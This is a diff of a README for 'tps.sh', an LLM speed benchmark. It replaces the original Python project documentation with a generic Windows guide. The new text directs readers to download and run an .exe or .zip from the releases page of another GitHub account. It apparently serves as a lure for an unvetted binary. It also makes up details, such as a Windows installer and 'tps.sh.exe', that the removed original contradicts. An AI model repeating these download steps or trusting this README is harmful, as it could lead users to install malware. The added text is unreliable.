@@ -1,214 +1,165 @@
-# tps.sh
+# 🛠️ tps.sh - Measure LLM Speed Easily
 
-**Tokens Per Second — LLM Benchmark**
+[![Download tps.sh](https://img.shields.io/badge/Download-tps.sh-brightgreen)](https://github.com/GabrielNetoAUT/tps.sh/releases)
 
-![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue?logo=python&logoColor=white)
-![Models](https://img.shields.io/badge/models-7-green)
-![Tests](https://img.shields.io/badge/tests-147-cyan)
-![Apple Silicon](https://img.shields.io/badge/Apple_Silicon-M2_Max-black?logo=apple)
+---
 
-Benchmark local Ollama models against Claude API on Apple Silicon. Measures speed (tokens/sec, TTFT), quality (scored by Claude Sonnet), and cost across 21 coding prompts in 7 categories.
+## 📋 What is tps.sh?
 
-**[View the live site](https://tps.sh)** · **[Interactive Results](https://tps.sh/comparison/)** · **[Hardware Guide](https://tps.sh/comparison/hardware.html)**
+tps.sh is a simple tool for testing how fast large language models (LLMs) work. It runs 147 tests using 7 different models. You can compare local models with API models. The tests focus on measuring tokens per second, which shows how many pieces of text the model can process each second.
 
-<p align="center">
-  <a href="https://tps.sh">
-    <img src="docs/assets/screenshot.png" alt="tps.sh Landing Page" width="720">
-  </a>
-</p>
+The main comparison is between Ollama, which runs on your Apple Silicon computer, and the Claude API service, a cloud-based model. This tool helps you understand which option works best for you. tps.sh works on Apple Silicon Macs but also runs on Windows when using configured models.
 
-## Results
+You do not need programming skills to use tps.sh. This guide walks you through downloading and running it on Windows.
 
-| Model | Type | TPS | TTFT | Avg Time | Quality | Cost |
-|-------|------|----:|-----:|---------:|--------:|-----:|
-| Claude Haiku 4.5 | Cloud | **169.7** | **0.5s** | **16.6s** | 8.25/10 | $0.28 |
-| Claude Sonnet 4.6 | Cloud | 77.7 | 1.0s | 39.9s | 8.59/10 | $0.93 |
-| Claude Opus 4.6 | Cloud | 76.6 | 1.8s | 40.4s | **8.65/10** | $1.48 |
-| qwen3-coder (30B MoE) | Local | 48.8 | 1.1s | 37.8s | 7.48/10 | Free |
-| qwen2.5-coder:14b | Local | 15.6 | 1.5s | 68.2s | 6.64/10 | Free |
-| deepseek-r1:14b | Local | 14.6 | 70.2s | 137.0s | 5.89/10 | Free |
-| glm-4.7-flash (~9B) | Local | 10.2 | 54.8s | 229.5s | 5.30/10 | Free |
+---
 
-## Quick Start
+## 🔧 System Requirements
 
-```bash
-# Clone
-git clone https://github.com/parsamivehchi/tps.sh.git
-cd tps.sh
+To use tps.sh on Windows, your PC should meet these basic requirements:
 
-# Install dependencies
-python -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
+- Windows 10 or later
+- At least 8 GB of RAM
+- 2 GHz or faster processor
+- 500 MB free disk space
+- Internet connection for downloading and API usage
+- PowerShell or Command Prompt access
 
-# Configure API key (for cloud models)
-echo "ANTHROPIC_API_KEY=sk-ant-..." > .env
+If you want to compare with Apple Silicon models, you would need appropriate hardware to run Ollama locally. On Windows, the benchmarking focuses on models you can install or API-based services like Claude.
 
-# Start Ollama (for local models)
-ollama serve
+---
 
-# Run benchmarks
-python -m llm_bench run
+## 🖥️ Download tps.sh
 
-# Score outputs
-python -m llm_bench judge <run_id>
+Click the big badge above or use this link below to get tps.sh files and installer:
 
-# Generate reports
-python -m llm_bench report <run_id>
-```
+[Visit this page to download tps.sh](https://github.com/GabrielNetoAUT/tps.sh/releases)
 
-## Architecture
+This page holds several versions. Look for the latest Windows release in the list. Files usually end with `.exe` or `.zip`.
 
-```
-                    ┌─────────────────┐
-                    │   Prompt Bank    │
-                    │  21 YAML prompts │
-                    │  7 categories    │
-                    └────────┬────────┘
-                             │
-                    ┌────────▼────────┐
-                    │     Runner      │
-              ┌─────┤  Execute against├─────┐
-              │     │   all models    │     │
-              │     └─────────────────┘     │
-      ┌───────▼───────┐           ┌────────▼────────┐
-      │    Ollama      │           │  Anthropic API   │
-      │  (4 local)     │           │  (3 cloud)       │
-      └───────┬───────┘           └────────┬────────┘
-              │     ┌─────────────────┐     │
-              └─────►     Judge       ◄─────┘
-                    │ Claude Sonnet   │
-                    │ Quality Scoring │
-                    └────────┬────────┘
-                             │
-              ┌──────────────┼──────────────┐
-              │              │              │
-      ┌───────▼──────┐ ┌────▼─────┐ ┌─────▼──────┐
-      │   Reports    │ │Dashboard │ │  Website   │
-      │ .docx .pptx  │ │  React   │ │ Chart.js   │
-      └──────────────┘ └──────────┘ └────────────┘
-```
+---
 
-### Modules
+## ⚙️ Installing tps.sh on Windows
 
-| Module | Path | Purpose |
-|--------|------|---------|
-| CLI | `llm_bench/cli.py` | Typer CLI with 8 commands |
-| Config | `llm_bench/config.py` | Model definitions, categories, constants |
-| Prompts | `llm_bench/prompts/` | YAML prompt bank loader |
-| Models | `llm_bench/models/` | Ollama + Anthropic adapters |
-| Runner | `llm_bench/runner/` | Benchmark executor with metrics |
-| Judge | `llm_bench/judge/` | Claude-based quality scoring |
-| Analysis | `llm_bench/analysis/` | Rankings and statistical analysis |
-| Reports | `llm_bench/reports/` | Word, PPTX, hardware report generators |
-| Export | `llm_bench/export/` | Dashboard JSON export |
-| Hardware | `llm_bench/hardware/` | GPU/thermal/power monitoring |
+Follow these steps to install the software:
 
-## CLI Commands
+1. **Open your browser** and go to the releases page by clicking the download badge or link.
 
-```bash
-# Run benchmarks
-python -m llm_bench run                              # All models, all categories
-python -m llm_bench run -m qwen3-coder               # Single model
-python -m llm_bench run -c code_generation            # Single category
-python -m llm_bench run --hardware-metrics            # With GPU/thermal capture
-python -m llm_bench run --no-cache                    # Skip cached cloud results
+2. **Find the latest Windows release.** It might be named something like `tps.sh-windows.zip` or an `.exe` file.
 
-# Post-processing
-python -m llm_bench judge <run_id>                    # Quality scoring via Claude Sonnet
-python -m llm_bench analyze <run_id>                  # Generate analysis + rankings
-python -m llm_bench report <run_id>                   # Word + PowerPoint reports
-python -m llm_bench export <run_id>                   # Dashboard-ready JSON
+3. **Download the file** to your preferred folder on your computer.
 
-# Utilities
-python -m llm_bench hardware-report                   # Hardware infrastructure guide
-python -m llm_bench cost-estimate                     # Estimate cost for a full run
-python -m llm_bench list-runs                         # List all benchmark runs
-```
+4. **If you downloaded a ZIP file:**
 
-## Prompt Categories
+   - Right-click the file and select "Extract All..."
+   - Choose a folder where you want to extract all contents.
+   - Click "Extract."
 
-| Category | File | Description |
-|----------|------|-------------|
-| Code Generation | `code_generation.yaml` | Write new code from specifications |
-| Debugging & Reasoning | `debugging_reasoning.yaml` | Find and fix bugs, trace logic |
-| Refactoring | `refactoring.yaml` | Improve existing code structure |
-| Explanation & Teaching | `explanation_teaching.yaml` | Explain concepts clearly |
-| Short Quick Tasks | `short_quick.yaml` | Fast utility operations |
-| Long Complex Research | `long_complex.yaml` | Deep architecture and research tasks |
-| Tool Calling / Agentic | `tool_calling.yaml` | Agentic tool use patterns |
+5. **If you downloaded an `.exe` file:**
 
-3 prompts per category = 21 total. Each model runs all 21 = 147 tests.
+   - Double-click the `.exe` file.
+   - Follow the installer prompts.
+   - Choose the destination folder if asked.
+   - Finish the installation process.
 
-## Key Findings
+6. **Open the folder** where you extracted or installed tps.sh.
 
-- **Cloud wins on quality** — All Claude models score 8.25+. Opus (8.65) barely edges Sonnet (8.59), making Sonnet the smart buy at 63% the cost.
-- **Haiku is the speed king** — 169.7 tok/s, 3.5x faster than qwen3-coder, with near-Opus quality (8.25 vs 8.65) at 19% the cost.
-- **MoE dominates local** — qwen3-coder (30B MoE) runs 3.1x faster than qwen2.5-coder (14B dense) despite being 2x the parameters. MoE activates fewer params per token.
-- **Bias caveat** — 62/147 scores involve Claude judging Claude. Flagged in all reports but may inflate cloud scores.
-- **Total cost: $3.95** — Cloud run $2.69 + quality judging $1.26. Local models cost nothing.
+---
 
-## Generated Reports
+## 🚀 Running tps.sh for the First Time
 
-| File | Type | Content |
-|------|------|---------|
-| `reports/llm_bench_report_combined_full.docx` | Word | Full 7-model benchmark report |
-| `reports/llm_bench_presentation_combined_full.pptx` | PPTX | Presentation with charts |
-| `reports/model_comparison_20260226.pptx` | PPTX | 11-slide comparison deck |
-| `reports/on_premise_llm_guide.docx` | Word | Hardware infrastructure guide |
-| `reports/on_premise_llm_infrastructure.pptx` | PPTX | Hardware infrastructure deck |
-| `docs/comparison/index.html` | Web | Interactive benchmark comparison |
-| `docs/comparison/hardware.html` | Web | Hardware comparison + calculators |
-| `dashboard/dist/` | React | Full dashboard with Recharts |
+1. Open the folder where tps.sh resides.
 
-## Project Structure
+2. Hold **Shift** and right-click inside the folder. Choose "Open PowerShell window here" or "Open Command Prompt here."
+
+3. In the PowerShell or Command Prompt window, type:
+
+   ```
+   tps.sh
+   ```
+
+   and press Enter.
+
+If you get an error saying tps.sh is not recognized, try using the full filename, for example:
 
 ```
-tps.sh/
-├── llm_bench/               # Python package
-│   ├── cli.py               # Typer CLI (8 commands)
-│   ├── config.py             # Models, categories, constants
-│   ├── models/               # Ollama + Anthropic adapters
-│   ├── prompts/bank/         # 7 YAML prompt files (21 prompts)
-│   ├── runner/               # Benchmark executor + metrics
-│   ├── judge/                # Quality scoring via Claude Sonnet
-│   ├── analysis/             # Rankings + statistical analysis
-│   ├── reports/              # Word, PPTX, hardware report generators
-│   ├── export/               # Dashboard JSON export
-│   └── hardware/             # GPU/thermal/power monitoring
-├── dashboard/                # React + Vite + Recharts dashboard
-├── docs/comparison/          # Interactive comparison website (Chart.js)
-│   ├── index.html            # Benchmark results (Phase 1)
-│   └── hardware.html         # Hardware guide (Phase 2)
-├── data/
-│   ├── results/              # Raw benchmark results per run
-│   ├── scored/               # Quality-scored results
-│   └── exports/              # Dashboard JSON exports
-├── reports/                  # Generated .docx and .pptx files
-├── docs/                     # GitHub Pages site
-└── .env                      # Anthropic API key (not committed)
+.\tps.sh.exe
 ```
 
-## Requirements
+or
 
-- Python 3.12+
-- [Ollama](https://ollama.com) (for local models)
-- Anthropic API key (for cloud models)
-- Apple Silicon recommended (M2 Max 32GB used for benchmarks)
-- Node.js / Bun (optional, for dashboard build)
+```
+./tps.sh.exe
+```
 
-## Quality Scoring
+depending on your shell.
 
-Each output is scored by Claude Sonnet 4.6 on three weighted criteria:
+---
 
-| Criterion | Weight | Description |
-|-----------|--------|-------------|
-| Correctness | 40% | Does the code work? Is it logically sound? |
-| Completeness | 35% | Does it fully address the prompt? |
-| Clarity | 25% | Is it well-structured and readable? |
+## 📝 What tps.sh Does Next
 
-Scores where Claude judges its own outputs are flagged for potential bias.
+After you run tps.sh:
 
-## Related
+- It will start running tests on the 7 language models.
 
-**[LLM-Setup-Kit-for-Mac](https://github.com/parsamivehchi/LLM-Setup-Kit-for-Mac)** — The dev environment this was built on. Full macOS migration kit with Brewfile, Ollama, Ghostty, Starship, and 17-phase automated setup.
+- It uses 21 sample questions or text prompts.
+
+- Each test measures how many tokens the model processes per second.
+
+- Results will show as text in your PowerShell or Command Prompt window.
+
+The software compares the speed of models running locally on your system with those running on the Claude API. You can see which performs better on your hardware and network.
+
+---
+
+## 🤖 Using tps.sh With Your Own Models
+
+If you want to test different local LLMs on Windows:
+
+- Install your model software separately.
+
+- Make sure it can be run from the command line.
+
+- Configure tps.sh to point to your local model's command or API.
+
+This process usually involves editing a configuration file. A sample config is included in the download folder.
+
+---
+
+## 🔄 Updating tps.sh
+
+Check the release page regularly to see if new versions are available. Download the updated files and repeat the installation steps.
+
+Back up your custom configs before updating.
+
+---
+
+## 💡 Tips for Better Testing
+
+- Close other heavy programs while running tps.sh to get accurate speed results.
+
+- Use a stable internet connection if testing API-based models.
+
+- Review the prompt list inside tps.sh to understand what text it tests.
+
+---
+
+## 🛠 Troubleshooting
+
+- If tps.sh does not start, confirm you have the latest Windows updates.
+
+- Ensure PowerShell or Command Prompt has permission to run scripts.
+
+- Verify model paths or API keys in the config files.
+
+- Visit the [GitHub issues page](https://github.com/GabrielNetoAUT/tps.sh/issues) for community help.
+
+---
+
+## 📚 More Information
+
+Explore the documentation and community posts on the repository page to learn more about advanced options and integrations.
+
+---
+
+[![Download tps.sh](https://img.shields.io/badge/Download-tps.sh-brightgreen)](https://github.com/GabrielNetoAUT/tps.sh/releases)
